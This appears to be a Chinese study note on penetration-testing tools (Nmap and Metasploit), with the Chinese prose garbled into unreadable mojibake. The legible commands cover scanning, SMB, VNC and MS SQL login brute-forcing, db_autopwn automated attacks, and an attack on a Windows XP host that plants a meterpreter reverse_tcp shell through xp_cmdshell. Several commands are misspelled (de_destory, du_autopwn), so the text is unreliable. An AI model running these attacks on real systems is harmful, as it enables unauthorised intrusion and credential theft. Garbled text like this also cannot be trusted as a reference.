# Ê∏óÈÄèÊµãËØïÂ∑•ÂÖ∑Â≠¶‰π†Ôºà‰∏ÄÔºâ

## Reference

„ÄäMetasploitÊ∏óÈÄèÊµãËØïÊåáÂçó„Äã
https://xz.aliyun.com/t/2482  


## 1. Nmap

### ÂèÇÊï∞ÈÄâÊã©

```
-sS ÊâßË°å‰∏ÄÊ¨°ÈöêÁßòÁöÑsvnÊè°ÊâãÂåÖTCP/IPÊâ´ÊèèÔºåÂà§Êñ≠Á´ØÂè£ÊòØÂê¶Â≠òÊ¥ª (sË°®Á§∫StealthÔºåÈöêÁßò)
-sT ÊâßË°å‰∏ÄÊ¨°ÈöêÁßòÁöÑTCP connect scan
-Pn ‰∏çÈÄöËøápingÊù•È¢ÑÂÖàÂà§Êñ≠‰∏ªÊú∫ÊòØÂê¶Â≠òÊ¥ªÔºåËøôÁÇπÂú®ÂÖ¨ÁΩëÊâ´ÊèèÂæàÈáçË¶ÅÔºåÂõ†‰∏∫ÂÖ¨ÁΩë‰∏ªÊú∫ÂæàÂ§öÁ¶ÅÊ≠¢pingÊù•Âà§Êñ≠ÂÖ∂Â≠òÊ¥ªÊÄß
-A, to enable OS and version detection, script scanning, and traceroute
-T4, for faster executionÔºàÂ§ñÁΩëÂ∞ΩÈáè‰∏çË¶ÅÁî®Ôºå‰ΩøÁî®TCPËøûÊé•‰ΩøÁî®T2ÊØîËæÉÂêàÈÄÇÔºâ
-sV, ËØÜÂà´ÊúçÂä°ÊåáÁ∫π‰ø°ÊÅØ
-O, ÂºÄÂêØÊìç‰ΩúÁ≥ªÁªüÊé¢ÊµãÁöÑÊâ´ÊèèÂäüËÉΩ
-F, Fast mode - Scan fewer ports than the default scan
-oX fileName, ËæìÂá∫‰∏∫‰∏Ä‰∏™
-PO Treat all hosts as online -- skip host discoverÔºåÂç≥‰ΩøÁî®IPÂçèËÆÆÂåÖÁöÑpingÊé¢Êµã‰∏ªÊú∫ÊòØÂê¶Â≠òÊ¥ª„ÄÇ
```


### POC

```bash
# ËØÜÂà´‰∏ªÊú∫‰ø°ÊÅØ
> nmap -sV -T4 -O -F --version-light xxxxxxxxx

# Ëé∑ÂèñËøúÁ®ãÂ§ö‰∏™‰∏ªÊú∫ÁöÑÁ≥ªÁªüÁ±ªÂûãÂèäÂºÄÊîæÁ´ØÂè£Ôºö  
> nmap¬†-sS¬†-P0¬†-sV¬†-O¬†192.168.1.100-200
```
### ÈÄâÈ°πÊÄªËßà[Á∫ø‰∏ãÂ§áÁî®]

ÂÖ∑‰ΩìÂèÇËÄÉÔºöhttps://zhuanlan.zhihu.com/p/25612351
```
Usage: nmap [Scan Type(s)] [Options] {target specification}
TARGET SPECIFICATION:
  Can pass hostnames, IP addresses, networks, etc.
  Ex: scanme.nmap.org, microsoft.com/24, 192.168.0.1; 10.0-255.0-255.1-254
  -iL <inputfilename>: Input from list of hosts/networks
  -iR <num hosts>: Choose random targets
  --exclude <host1[,host2][,host3],...>: Exclude hosts/networks
  --excludefile <exclude_file>: Exclude list from file
HOST DISCOVERY:
  -sL: List Scan - simply list targets to scan
  -sP: Ping Scan - go no further than determining if host is online
  -P0: Treat all hosts as online -- skip host discovery
  -PS/PA/PU [portlist]: TCP SYN/ACK or UDP discovery probes to given ports
  -PE/PP/PM: ICMP echo, timestamp, and netmask request discovery probes
  -n/-R: Never do DNS resolution/Always resolve [default: sometimes resolve]
SCAN TECHNIQUES:
  -sS/sT/sA/sW/sM: TCP SYN/Connect()/ACK/Window/Maimon scans
  -sN/sF/sX: TCP Null, FIN, and Xmas scans
  --scanflags <flags>: Customize TCP scan flags
  -sI <zombie host[:probeport]>: Idlescan
  -sO: IP protocol scan
  -b <ftp relay host>: FTP bounce scan
PORT SPECIFICATION AND SCAN ORDER:
  -p <port ranges>: Only scan specified ports
    Ex: -p22; -p1-65535; -p U:53,111,137,T:21-25,80,139,8080
  -F: Fast - Scan only the ports listed in the nmap-services file)
  -r: Scan ports consecutively - don't randomize
SERVICE/VERSION DETECTION:
  -sV: Probe open ports to determine service/version info
  --version-light: Limit to most likely probes for faster identification
  --version-all: Try every single probe for version detection
  --version-trace: Show detailed version scan activity (for debugging)
OS DETECTION:
  -O: Enable OS detection
  --osscan-limit: Limit OS detection to promising targets
  --osscan-guess: Guess OS more aggressively
TIMING AND PERFORMANCE:
  -T[0-6]: Set timing template (higher is faster)
  --min-hostgroup/max-hostgroup <msec>: Parallel host scan group sizes
  --min-parallelism/max-parallelism <msec>: Probe parallelization
  --min-rtt-timeout/max-rtt-timeout/initial-rtt-timeout <msec>: Specifies
      probe round trip time.
  --host-timeout <msec>: Give up on target after this long
  --scan-delay/--max-scan-delay <msec>: Adjust delay between probes
FIREWALL/IDS EVASION AND SPOOFING:
  -f; --mtu <val>: fragment packets (optionally w/given MTU)
  -D <decoy1,decoy2[,ME],...>: Cloak a scan with decoys
  -S <IP_Address>: Spoof source address
  -e <iface>: Use specified interface
  -g/--source-port <portnum>: Use given port number
  --data-length <num>: Append random data to sent packets
  --ttl <val>: Set IP time-to-live field
  --spoof-mac <mac address, prefix, or vendor name>: Spoof your MAC address
OUTPUT:
  -oN/-oX/-oS/-oG <file>: Output scan results in normal, XML, s|<rIpt kIddi3,
     and Grepable format, respectively, to the given filename.
  -oA <basename>: Output in the three major formats at once
  -v: Increase verbosity level (use twice for more effect)
  -d[level]: Set or increase debugging level (Up to 9 is meaningful)
  --packet-trace: Show all packets sent and received
  --iflist: Print host interfaces and routes (for debugging)
  --append-output: Append to rather than clobber specified output files
  --resume <filename>: Resume an aborted scan
  --stylesheet <path/URL>: XSL stylesheet to transform XML output to HTML
  --no-stylesheet: Prevent Nmap from associating XSL stylesheet w/XML output
MISC:
  -6: Enable IPv6 scanning
  -A: Enables OS detection and Version detection
  --datadir <dirname>: Specify custom Nmap data file location
  --send-eth/--send-ip: Send packets using raw ethernet frames or IP packets
  --privileged: Assume that the user is fully privileged
  -V: Print version number
  -h: Print this help summary page.
EXAMPLES:
  nmap -v -A scanme.nmap.org
  nmap -v -sP 192.168.0.0/16 10.0.0.0/8
  nmap -v -iR 10000 -P0 -p 80
```




### Á´ØÂè£Êâ´Êèè

Êâ´Êèè‰∏ªÊú∫ÂºÄÊîæÁöÑÁ´ØÂè£Ôºö
```bash
> nmap -sT -v xxx.xxx.xxx.xxx
```

ËØ¶ÁªÜÊòæÁ§∫ÔºåsynÊé¢ÊµãÔºåÈ´òÈÄüÊâ´ÊèèÔºåÁ≥ªÁªüÂíåÊúçÂä°ÁâàÊú¨‰ø°ÊÅØÔºåËÑöÊú¨Êâ´ÊèèÂíåË∑ØÁî±Ë∑üË∏™Ôºö
```bash
> nmap -v -sS -A -T4 target
```

-sTË°®Á§∫tcpÁ´ØÂè£Êâ´Êèè(ÂÆåÊï¥‰∏âÊ¨°Êè°Êâã)Ôºå-vË°®Á§∫ÊòæÁ§∫ËØ¶ÁªÜ‰ø°ÊÅØ 



## 2. Metasploit

### 2.1 ‰∏ÄÊ¨°ÁÆÄÂçïÁöÑ‰ΩøÁî®ÊµÅÁ®ã

#### ÂêØÂä®MSF

```bash
> msfconsole
```

#### ÊêúÁ¥¢ÊºèÊ¥û

```bash
> search wordpress
```

#### ÈÄâÊã©ÊºèÊ¥ûÂà©Áî®exp

```bash
use xxx
```

#### ËÆæÁΩÆÊîªÂáªËΩΩËç∑ÔºàPayloadÔºâ

```bash
# 'show options' means showing the advandce options to custom. e.g.
> msf exploit(windows/mysql/mysql_mof) > show options
```

#### ËÆæÁΩÆÊîªÂáªÈÄâÈ°π

```bash
# set the information about the exploit process. e.g.
> set RHOST 115.28.xxx.xxx
```

#### ÂºÄÂßãÊîªÂáª

```bash
# Exploit it!
> exploit
```

#### Âª∫Á´ã‰ºöËØù

```bash
# ÂàóÂá∫ÊâÄÊúâ‰ºöËØù
> sessions -l
# ËøõÂÖ•1Âè∑‰ºöËØù
> sessions ‚Äìi 1 
# Êü•ËØ¢ÊîªÂáªËÄÖÁöÑË∫´‰ªΩ
> getuid 
```

### 2.2 ‰∏Ä‰∫õÁªÑ‰ª∂

#### PayloadÁîüÊàêÂô®

```bash
# msfpayloadÂ∑≤Ë¢´ÂºÉÁî®
> msfpayload -h
# Áé∞‰ΩøÁî®msfvenom 
> msfvenom -h
```

#### Êï∞ÊçÆÂ∫ìÂ≠êÁ≥ªÁªü

ÂèØÂàõÂª∫Êï∞ÊçÆÂ∫ìÂ≠êÁ≥ªÁªüÔºåÁî®‰∫éÂ≠òÂÇ®ÊµãËØïËøáÁ®ã‰∏≠ÁöÑÊï∞ÊçÆ„ÄÇÊîØÊåÅPostgre SQLÔºåMySQLÔºåSQLite3Êï∞ÊçÆÂ∫ì„ÄÇ

//TODO

https://blog.csdn.net/FunkyPants/article/details/78483792



### 2.3 ÊÉÖÊä•ÊêúÈõÜ

ËÆ∞ÂΩïÁöÑËØ¶ÁªÜ‰∏éÂê¶ÊòØ‰∏ÄÊ¨°Ê∏óÈÄèÊµãËØïÊàêË¥•ÁöÑÂÖ≥ÈîÆÁÇπ

#### Ë¢´Âä®‰ø°ÊÅØÊêúÈõÜ(Passive Information Gathering)

ËøôÈáåÁöÑ‰∏ªÂä®‰∏éË¢´Âä®ÊâÄÊåáÁöÑÊòØÔºåÊòØ‰∏çÊòØ‰∏éÁõÆÊ†á‰∏ªÊú∫Áõ¥Êé•ËøõË°å‰∫§‰∫í„ÄÇÂ¶ÇÊûú‰∏çÊòØÁõ¥Êé•ËøõË°å‰∫§‰∫íÔºå‰æãÂ¶Ç‰ΩøÁî®ShodanÊü•ËØ¢ÔºåËøô‰∫õÂ∞±ÊòØË¢´Âä®‰ø°ÊÅØÊêúÈõÜÔºàÊàë‰ª¨Âà©Áî®ÁΩëÁªú‰∏äÂÖ∂‰ªñ‚Äú‰∫∫‚ÄùÊèê‰æõÁªôÊàë‰ª¨ÁöÑ‰ø°ÊÅØÔºåÂõ†Ê≠§Êàë‰ª¨ÊòØË¢´Âä®Ëé∑Âèñ‰ø°ÊÅØÁöÑÔºâ„ÄÇÁõ∏ÂèçÂú∞Ôºå‰∏éÁõÆÊ†áÊúçÂä°Âô®Áõ¥Êé•ËøõË°å‰∫§‰∫íÔºå‰æãÂ¶Ç‰ΩøÁî®NmapËøõË°åÊâ´ÊèèÔºåÂ∞±ÊòØ‰∏ªÂä®ÁöÑ‰ø°ÊÅØÊêúÈõÜ‰∫Ü„ÄÇ

##### whois 

Á°ÆÂÆöÁΩëÁªúËµÑ‰∫ßÊâÄÊúâËÄÖÁöÑÁõ∏ÂÖ≥‰ø°ÊÅØ

##### DNS Êü•ËØ¢

1. netlookup
ÁªàÁ´ØÂ∑•ÂÖ∑ÔºåÂèØ‰ª•Áõ¥Êé•Êü•ÁúãÂüüÂêçÂØπÂ∫îÁöÑIP‰ø°ÊÅØ



#### ‰∏ªÂä®‰ø°ÊÅØÊêúÈõÜ(Positive information Gathering)

1. ‰ΩøÁî®Nmap

‰∏äÊñáüëÜ

2. Ê°ÜÊû∂Êèê‰æõÁöÑÊâ´ÊèèÂ∑•ÂÖ∑
```bash
msf > search portscan
# ‰ΩøÁî®synÊâ´ÊèèÂô®ÔºàTCP/IPÊè°ÊâãÂåÖÔºâ
msf > use scanner/portscan/syn
msf > set...
msf > run
```

#### ÈíàÂØπÊÄßÊâ´Êèè

##### ÊúçÂä°Âô®Ê∂àÊÅØÂùóÂçèËÆÆÊâ´Êèè

Âà©Áî®MicrosoftÂà∂ÂÆöÁöÑÁΩëÁªúÈÄöËÆØÂçèËÆÆ‰∏≠Ë°®Á§∫Âùó‰∏≠ÁöÑSMBÔºàÊúçÂä°Âô®‰ø°ÊÅØÂùóÂçèËÆÆÔºâÔºåÈÅçÂéÜÁΩëÁªúÔºåËé∑ÂèñWindowsÁ≥ªÁªüÁâàÊú¨Âè∑„ÄÇ  

```bash
msf > use scanner/smb/smb_version
msf > set...
msf > run
```

##### Microsoft SQL ServerÊâ´Êèè

```bash
msf > use scanner/mssql/mssql_ping
...
```

##### SSHÊúçÂä°Êâ´Êèè

```bash
msf > use scanner/ssh/ssh_version
...
```

##### FTPÊâ´Êèè

```bash
msf > use scanner/ftp/ftp_version
...
```

##### SNMPÔºàÁÆÄÂçïÁΩëÁÆ°ÂçèËÆÆÔºâÊâ´Êèè

```bash
msf > use scanner/snmp/snmp_login
...
```

##### Ëá™Âà∂Êâ´ÊèèÂô®





### 2.4 ÊºèÊ¥ûÊâ´Êèè

#### NeXpose

Rapid7ÂÖ¨Âè∏ÁöÑ‰∏ÄÊ¨æÊºèÊ¥ûÊâ´Êèè‰∫ßÂìÅÔºåÊúâÁ§æÂå∫ÂÖçË¥πÁâà„ÄÇÂèØ‰ΩøÁî®WebÁ´ØÂõæÂΩ¢ÂåñÊòæÁ§∫Ôºàlocalhost:3780ÔºâÔºå‰πüÂèØ‰ΩøÁî®MSFÁªàÁ´ØÂêØÂä®„ÄÇ  

##### ÁîüÊàêÊä•ÂëäÂØºÂÖ•MSF

ÂàõÂª∫‰∏Ä‰∏™Êñ∞Êï∞ÊçÆÂ∫ìÔºàÂèÇËßÅ‰∏äÊñáÔºâÔºå‰ΩøÁî®```db_connect```ËøûÊé•Ôºå‰ΩøÁî®```db_import```ÂØºÂÖ•XMLÊ†ºÂºèÁöÑÊä•Âëä„ÄÇ‰ΩøÁî®```db_hosts```ÊµãËØïÊòØÂê¶ÂÄíÂÖ•ÊàêÂäü„ÄÇ‰ΩøÁî®```db_vulns```Êü•ÁúãÂØºÂÖ•ÊºèÊ¥ûÁöÑËØ¶ÁªÜ‰ø°ÊÅØ„ÄÇ

##### Âú®MSFÂÜÖ‰ΩøÁî®NeXpose

```bash
# Âà†Èô§Áé∞ÊúâÂ∫ì
msf > de_destory postgres:pass@127.0.0.1/msf3
# ÂàõÂª∫‰∏Ä‰∏™Êñ∞Â∫ì
msf > de_connect postgres:pass@127.0.0.1/msf3
# ËΩΩÂÖ•nexposeÊèí‰ª∂
msf > load nexpose
# ÊòæÁ§∫ÂØºÂÖ•ÁöÑnexposeÁöÑÂ∏ÆÂä©
msf > help
# Á¨¨‰∏ÄÊ¨°ËøûÊé•ÈúÄË¶ÅËÆæÁΩÆÂÆâË£ÖÁöÑnexposeÂÆû‰æã
msf > nexpose_connect -h
...
# Êâ´ÊèèÁõÆÊ†áÂú∞ÂùÄ
msf > nexpose_scan xxx.xxx.xxx.xxx
# Êâ´ÊèèÂêéÔºåÁªìÊûúÂ∑≤Â≠òÂú®Êï∞ÊçÆÂ∫ì
msf > db_hosts -c address
msf > db_vulns
```


#### Nessus

ÈªòËÆ§Á´ØÂè£‰∏∫‰∏∫8834Ôºå‰ΩøÁî®Ê≠•È™§‰∏éNeXposeÁõ∏ÂêåüëÜ

#### ‰∏ìÁî®ÊºèÊ¥ûÊâ´ÊèèÂô®

##### SMB Login check

ÂØπWindows‰∏ªÊú∫ÁöÑÁî®Êà∑ÂêçÂíåÂè£‰ª§ËøõË°åÁ†¥Ëß£„ÄÇ
```bash
msf > use auxiliary/scanner/smb/smb_login
msf > show options
```

##### VNCÁ©∫Âè£‰ª§Êâ´Êèè

VNCÂç≥ËôöÊãüÁΩëÁªúËÆ°ÁÆóÔºåÊèê‰æõËøúÁ®ãËÆøÈóÆÁ≥ªÁªüÊ°åÈù¢ÁöÑÊúçÂä°„ÄÇÊñ∞ÁâàÊú¨ÁöÑVNC‰∏çÂÜçÂÖÅËÆ∏‰ΩøÁî®VNCÔºåÂπ∂‰∏îÁªùÂ§ßÂ§öÊï∞ÊÉÖÂÜµ‰ºö‰∏ÄÊó†ÊâÄËé∑„ÄÇ‰ΩÜÊ∏óÈÄèÁéØÂ¢ÉÊòØÂ§öÊ†∑ÁöÑÔºå‰ª•Âèä‰∏Ä‰∏™‰ºòÁßÄÁöÑÊ∏óÈÄèÊµãËØïÂ∑•Á®ãÂ∏à‰ºöÂØπÁõÆÊ†áÈááÂèñÂçÉÊñπÁôæËÆ°ÁöÑÊâãÊÆµ„ÄÇ  
```bash
msf > use auxiliary/scanner/vnc/vnc_none_auth
msf > show options
```

##### X11ÊúçÂä°Âô®Êâ´Êèè

```bash
msf > search x11
...
msf > use auxiliary/scanner/x11/open_x11

```
XÁ≥ªÁªüÁî®‰∫éÂ§ÑÁêÜÂåÖÊã¨Èº†Ê†áÂíåÈîÆÁõòÂú®ÂÜÖÁöÑÂõæÂΩ¢Áî®Êà∑ÁïåÈù¢ÔºåÊàë‰ª¨ÂèØ‰ª•ÁªìÂêàBack|TrackÁöÑxrayÂ∑•ÂÖ∑ÂØπÁõÆÊ†áÁöÑÈîÆÁõòËæìÂÖ•ËøõË°åËÆ∞ÂΩï„ÄÇ


#### Âà©Áî®Êâ´ÊèèÁªìÊûúËá™Âä®ÂåñÊîªÂáª

‰ΩøÁî®MetasploitÁöÑautopwnÂ∑•ÂÖ∑ÔºåÊ†πÊçÆÊºèÊ¥ûÊâ´ÊèèÂô®ÁöÑÁªìÊûúËá™Âä®ËøõË°åÊ∏óÈÄèÊîªÂáª„ÄÇ
```bash
msf > db_connect portgres:pass@127.0.0.1/msf3
msf > db_import your_nessues_export_file_path
msf > du_autopwn -e -t -r -x -p
...
```
‰ΩøÁî®db_autopwnÂëΩ‰ª§ÂêéËá™Âä®ËøõË°åÊ∏óÈÄèÊîªÂáªÔºåÂÖ∂ÂèÇÊï∞Âê´‰πâÂ¶Ç‰∏ãÔºö
|argument|implication|
|--- | ----|
|-e|ÂØπÊâÄÊúâÁõÆÊ†áÂèëËµ∑ËøõÊîª|
|-t|ÊòæÁ§∫ÊâÄÊúâÂåπÈÖçÁöÑÊ®°Âùó|
|-r|Âà©Áî®ÂèçÂºπshellÁöÑpayload|
|-x|Ê†πÊçÆÊºèÊ¥ûÈÄâÊã©ÊîªÂáªÊ®°Âùó|
|-p|Ê†πÊçÆÂºÄÊîæÁ´ØÂè£ÈÄâÊã©ÊîªÂáªÊ®°Âùó|

ÂêéÈù¢‰ºöÂØπËØ•Ê®°ÂùóËøõË°åËØ¶ÁªÜ‰ªãÁªç„ÄÇ




### Ê∏óÈÄèÊµãËØïÊâßË°åÊ†áÂáÜ

### Exploit-db.com

‰∏Ä‰∏™ÁªºÂêàÊÄßÁöÑËΩØ‰ª∂ËÑÜÂº±ÊÄßÂíåÊºèÊ¥û‰ø°ÊÅØÊî∂ÈõÜÂπ≥Âè∞ÔºåÂÆÉ‰∏∫ËΩØ‰ª∂ÂºÄÂèëËÄÖ„ÄÅÂÆâÂÖ®ÊºèÊ¥ûÁ†îÁ©∂‰∫∫Âëò„ÄÅÊ∏óÈÄèÊµãËØïËÄÖÊèê‰æõ‰∫ÜÂ§ßÈáèÁöÑÊúâÂÖ≥‰∫éÂêÑ‰∏™Êìç‰ΩúÁ≥ªÁªü„ÄÅ‰∏ªÊµÅËΩØ‰ª∂Â∫îÁî®ÁöÑËÑÜÂº±ÊÄß‰ø°ÊÅØÊàñÊºèÊ¥ûÂà©Áî®Á®ãÂ∫è



### Ê∏óÈÄèÊîªÂáª‰πãÊóÖ

#### Â∏∏Áî®ÂëΩ‰ª§

##### show exploits

##### show auxiliary

##### show options

##### show payloads

##### show targets

##### search

Ê†πÊçÆÂÖ≥ÈîÆËØçÊêúÁ¥¢ÊîªÂáªÊ®°Âùó

##### back

##### use

##### set & unset

ÂèòÈáè‰∏çÂøÖÈ°ª‰∏∫Â§ßÂÜôÔºå‰ΩÜËøôÊòØ‰∏™Â•Ω‰π†ÊÉØ

##### setg & unsetg

ÂØπÂÖ®Â±ÄÂèÇÊï∞ËøõË°åËÆæÁΩÆÊàñÊ∏ÖÊ•ö

##### save

‰øùÂ≠òsetgËÆæÁΩÆÁöÑÂÖ®Â±ÄÂèòÈáèÔºå‰∏ãÊ¨°ÂêØÂä®msfconsoleÊó∂ÁªßÁª≠‰ΩøÁî®

##### info	



#### Meterpreter

##### e.g. ÊîªÂáª‰∏ÄÂè∞Windows XP

1. Êâ´ÊèèÁ´ØÂè£ÊúçÂä°

```bash
msf > nmap -sT -A -PO xxx.xxx
```
ÂèëÁé∞MS SQLÊúçÂä°  

2. ÊîªÂáªMS SQLÔºåTCPÈªòËÆ§Á´ØÂè£‰∏ÄËà¨‰∏∫1433ÔºåUDPÈªòËÆ§Á´ØÂè£‰∏∫1434

```bash
msf > nmap -sU xxx.xxx -p1434
msf > use scanner/mssql/mssql_ping
```

3. Êö¥ÂäõÁ†¥Ëß£MS SQL

```bash
msf > use scanner/mssql/mssql_login
msf > show options
msf > set PASS_FILE /xxx/xxx/xxx.txt
...
msf > exploit
```
Ë°•ÂÖÖÔºöFast-TrackÂ∑•ÂÖ∑

4. Ê≥®ÂÖ•Meterpreter shell
Âõ†‰∏∫ÊòØXPÁ≥ªÁªüÔºåÊâÄ‰ª•Êàë‰ª¨Âà©Áî®xp_cmdshellËøõË°å‰∫§‰∫íÔºåËøõ‰∏ÄÊ≠•ÁöÑÊÄùË∑ØÊòØ‰∏ä‰º†Meterpreter shellÊù•Êõ¥Ê∑±ÂÖ•ÁöÑÊ∏óÈÄè„ÄÇ  
Êñπ‰æøÁöÑÊòØÔºåMSFÂ∑≤ÁªèÂê´Êúâ‰∏Ä‰∏™**Ê®°Âùó**ÔºåÂèØ‰ª•ÂÆûÁé∞ÈÄöËøáxp_cmdshellÊù•Ê§çÂÖ•‰ªªÊÑèMetasploitÊîªÂáªËΩΩËç∑ÔºàÂ¶ÇMeterpreterÔºâÔºåËøáÁ®ãÂ¶Ç‰∏ãÔºö

```bash
msf > use windows/mssql/mssql_payload
msf > show options
# ËÆæÁΩÆËá™Â∑±ÈÄâÊã©ÁöÑpayload
msf > set payload windows/meterpreter/reverse_tcp
msf > set LHOST //TODO
msf > set LPORT 443
...
msf > exploit
```


## ÊùÇ

### Â∏∏Áî®Á´ØÂè£ÂèäÊúçÂä°

Á¶ªÁ∫øÁΩëÁ´ô‰øùÂ≠ò

### 

